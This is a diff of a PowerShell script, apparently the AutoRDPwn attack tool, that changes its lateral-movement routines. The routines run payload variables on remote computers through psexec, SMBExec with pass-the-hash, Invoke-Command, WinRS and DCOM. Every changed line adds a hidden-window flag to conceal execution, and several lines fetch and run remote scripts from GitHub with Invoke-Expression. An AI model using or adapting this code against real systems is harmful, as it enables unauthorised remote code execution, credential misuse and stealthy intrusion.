@@ -116,14 +116,14 @@ function Remove-Exclusions {
 	if(!$PlainTextPassword) { [Console]::SetCursorPosition(0,"$cursortop") ; Write-Host "$txt25" -NoNewLine -ForegroundColor Gray ; Write-Host "********" } 
 	$Host.UI.RawUI.ForegroundColor = 'Blue'
         Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/Invoke-PSexec.ps1')
-	if(!$user) { .\psexec.exe \\$computer -h -d powershell.exe "$Pwn1" -nobanner -accepteula
-        .\psexec.exe \\$computer -h -d powershell.exe "$Pwn2" -nobanner -accepteula
-        .\psexec.exe \\$computer -h -d powershell.exe "$Pwn3" -nobanner -accepteula
-        .\psexec.exe \\$computer -h -d powershell.exe "$Pwn4" -nobanner -accepteula }
-	if($user) { .\psexec.exe \\$computer -u $user -p $PlainTextPassword -h -d powershell.exe "$Pwn1" -nobanner -accepteula
-        .\psexec.exe \\$computer -u $user -p $PlainTextPassword -h -d powershell.exe "$Pwn2" -nobanner -accepteula
-        .\psexec.exe \\$computer -u $user -p $PlainTextPassword -h -d powershell.exe "$Pwn3" -nobanner -accepteula
-        .\psexec.exe \\$computer -u $user -p $PlainTextPassword -h -d powershell.exe "$Pwn4" -nobanner -accepteula }
+	if(!$user) { .\psexec.exe \\$computer -h -d powershell.exe -windowstyle hidden "$Pwn1" -nobanner -accepteula
+        .\psexec.exe \\$computer -h -d powershell.exe -windowstyle hidden "$Pwn2" -nobanner -accepteula
+        .\psexec.exe \\$computer -h -d powershell.exe -windowstyle hidden "$Pwn3" -nobanner -accepteula
+        .\psexec.exe \\$computer -h -d powershell.exe -windowstyle hidden "$Pwn4" -nobanner -accepteula }
+	if($user) { .\psexec.exe \\$computer -u $user -p $PlainTextPassword -h -d powershell.exe -windowstyle hidden "$Pwn1" -nobanner -accepteula
+        .\psexec.exe \\$computer -u $user -p $PlainTextPassword -h -d powershell.exe -windowstyle hidden "$Pwn2" -nobanner -accepteula
+        .\psexec.exe \\$computer -u $user -p $PlainTextPassword -h -d powershell.exe -windowstyle hidden "$Pwn3" -nobanner -accepteula
+        .\psexec.exe \\$computer -u $user -p $PlainTextPassword -h -d powershell.exe -windowstyle hidden "$Pwn4" -nobanner -accepteula }
         del .\psexec.exe }
 
         '2' {
@@ -140,11 +140,11 @@ function Remove-Exclusions {
         if(!$hash) { Write-Host ; Write-Host $txt6 -ForegroundColor Red ; sleep -milliseconds 2500 }} until ( $hash )
         Write-Host ; $Host.UI.RawUI.ForegroundColor = 'Blue'
         Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/Invoke-SMBExec.ps1')
-        Invoke-SMBExec -Target $computer -Domain $domain -Username $user -Hash $hash -Command "powershell.exe $Pwn1" ; Write-Host
-        Invoke-SMBExec -Target $computer -Domain $domain -Username $user -Hash $hash -Command "powershell.exe $Pwn2" ; Write-Host
-        Invoke-SMBExec -Target $computer -Domain $domain -Username $user -Hash $hash -Command "powershell.exe $Pwn3" ; Write-Host
-        Invoke-SMBExec -Target $computer -Domain $domain -Username $user -Hash $hash -Command "powershell.exe $Pwn4" ; Write-Host
-        Invoke-SMBExec -Target $computer -Domain $domain -Username $user -Hash $hash -Command "powershell.exe $Pwn5" }
+        Invoke-SMBExec -Target $computer -Domain $domain -Username $user -Hash $hash -Command "powershell.exe -windowstyle hidden $Pwn1" ; Write-Host
+        Invoke-SMBExec -Target $computer -Domain $domain -Username $user -Hash $hash -Command "powershell.exe -windowstyle hidden $Pwn2" ; Write-Host
+        Invoke-SMBExec -Target $computer -Domain $domain -Username $user -Hash $hash -Command "powershell.exe -windowstyle hidden $Pwn3" ; Write-Host
+        Invoke-SMBExec -Target $computer -Domain $domain -Username $user -Hash $hash -Command "powershell.exe -windowstyle hidden $Pwn4" ; Write-Host
+        Invoke-SMBExec -Target $computer -Domain $domain -Username $user -Hash $hash -Command "powershell.exe -windowstyle hidden $Pwn5" }
 
 	'3' {
         Write-Host ; Write-Host "$txt23" -NoNewLine -ForegroundColor Gray ; $cursortop = [System.Console]::get_CursorTop()
@@ -185,14 +185,14 @@ function Remove-Exclusions {
         $password = $Host.UI.ReadLineAsSecureString() ; $credential = New-Object System.Management.Automation.PSCredential ( $user, $password )
 	if(!$credential) { [Console]::SetCursorPosition(0,"$cursortop") ; Write-Host "$txt25" -NoNewLine -ForegroundColor Gray ; Write-Host "********" }
 	Write-Host ; $Host.UI.RawUI.ForegroundColor = 'Blue'
-        if(!$user) { Invoke-Command -Computer $computer -ScriptBlock { powershell.exe $using:Pwn1 }
-        Invoke-Command -Computer $computer -ScriptBlock { powershell.exe $using:Pwn2 }
-        Invoke-Command -Computer $computer -ScriptBlock { powershell.exe $using:Pwn3 }
-        Invoke-Command -Computer $computer -ScriptBlock { powershell.exe $using:Pwn4 }}
-	if($user) { Invoke-Command -Computer $computer -credential $credential -ScriptBlock { powershell.exe $using:Pwn1 }
-        Invoke-Command -Computer $computer -credential $credential -ScriptBlock { powershell.exe $using:Pwn2 }
-        Invoke-Command -Computer $computer -credential $credential -ScriptBlock { powershell.exe $using:Pwn3 }
-        Invoke-Command -Computer $computer -credential $credential -ScriptBlock { powershell.exe $using:Pwn4 }}}
+        if(!$user) { Invoke-Command -Computer $computer -ScriptBlock { powershell.exe -windowstyle hidden $using:Pwn1 }
+        Invoke-Command -Computer $computer -ScriptBlock { powershell.exe -windowstyle hidden $using:Pwn2 }
+        Invoke-Command -Computer $computer -ScriptBlock { powershell.exe -windowstyle hidden $using:Pwn3 }
+        Invoke-Command -Computer $computer -ScriptBlock { powershell.exe -windowstyle hidden $using:Pwn4 }}
+	if($user) { Invoke-Command -Computer $computer -credential $credential -ScriptBlock { powershell.exe -windowstyle hidden $using:Pwn1 }
+        Invoke-Command -Computer $computer -credential $credential -ScriptBlock { powershell.exe -windowstyle hidden $using:Pwn2 }
+        Invoke-Command -Computer $computer -credential $credential -ScriptBlock { powershell.exe -windowstyle hidden $using:Pwn3 }
+        Invoke-Command -Computer $computer -credential $credential -ScriptBlock { powershell.exe -windowstyle hidden $using:Pwn4 }}}
 
         '5' {
         Write-Host ; Write-Host "$txt23" -NoNewLine -ForegroundColor Gray ; $cursortop = [System.Console]::get_CursorTop()
@@ -205,10 +205,10 @@ function Remove-Exclusions {
 	$password = $Host.UI.ReadLineAsSecureString() ; $PlainTextPassword = ConvertFrom-SecureToPlain $password
 	if(!$PlainTextPassword) { Write-Host ; Write-Host $txt6 -ForegroundColor Red ; sleep -milliseconds 2500 }} until ( $PlainTextPassword )
 	$Host.UI.RawUI.ForegroundColor = 'Blue' ; [Console]::SetCursorPosition(0,"$cursortop")
-        WinRS -r:$computer -u:$user -p:$PlainTextPassword "powershell.exe $Pwn1"
-        WinRS -r:$computer -u:$user -p:$PlainTextPassword "powershell.exe $Pwn2"
-        WinRS -r:$computer -u:$user -p:$PlainTextPassword "powershell.exe $Pwn3"
-        WinRS -r:$computer -u:$user -p:$PlainTextPassword "powershell.exe $Pwn4" ; Write-Host }
+        WinRS -r:$computer -u:$user -p:$PlainTextPassword "powershell.exe -windowstyle hidden $Pwn1"
+        WinRS -r:$computer -u:$user -p:$PlainTextPassword "powershell.exe -windowstyle hidden $Pwn2"
+        WinRS -r:$computer -u:$user -p:$PlainTextPassword "powershell.exe -windowstyle hidden $Pwn3"
+        WinRS -r:$computer -u:$user -p:$PlainTextPassword "powershell.exe -windowstyle hidden $Pwn4" ; Write-Host }
 
 	'6' {
         Write-Host ; $test = Test-Command tscon ; if($test -in 'True'){ Write-Host "$txt28" -ForegroundColor Blue ; Write-Host
@@ -224,11 +224,11 @@ function Remove-Exclusions {
 	$computer = 'localhost' ; Write-Host "$txt23" -NoNewLine -ForegroundColor Gray ; Write-Host "localhost" }
 	Write-Host ; $Host.UI.RawUI.ForegroundColor = 'Blue'
 	Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/Invoke-DCOM.ps1')
-	Invoke-DCOM -ComputerName $computer -Method ShellWindows -Command "powershell.exe $Pwn1" ; Write-Host
-	Invoke-DCOM -ComputerName $computer -Method ShellWindows -Command "powershell.exe $Pwn2" ; Write-Host
-	Invoke-DCOM -ComputerName $computer -Method ShellWindows -Command "powershell.exe $Pwn3" ; Write-Host
-	Invoke-DCOM -ComputerName $computer -Method ShellWindows -Command "powershell.exe $Pwn4" ; Write-Host
-	Invoke-DCOM -ComputerName $computer -Method ShellWindows -Command "powershell.exe $Pwn5" }
+	Invoke-DCOM -ComputerName $computer -Method ShellWindows -Command "powershell.exe -windowstyle hidden $Pwn1" ; Write-Host
+	Invoke-DCOM -ComputerName $computer -Method ShellWindows -Command "powershell.exe -windowstyle hidden $Pwn2" ; Write-Host
+	Invoke-DCOM -ComputerName $computer -Method ShellWindows -Command "powershell.exe -windowstyle hidden $Pwn3" ; Write-Host
+	Invoke-DCOM -ComputerName $computer -Method ShellWindows -Command "powershell.exe -windowstyle hidden $Pwn4" ; Write-Host
+	Invoke-DCOM -ComputerName $computer -Method ShellWindows -Command "powershell.exe -windowstyle hidden $Pwn5" }
 
         'M' { Show-Banner ; Show-Modules
         $Random = New-Object System.Random ; $txt8 -split '' | ForEach-Object{Write-Host $_ -nonew ; Start-Sleep -milliseconds $(1 + $Random.Next(25))}
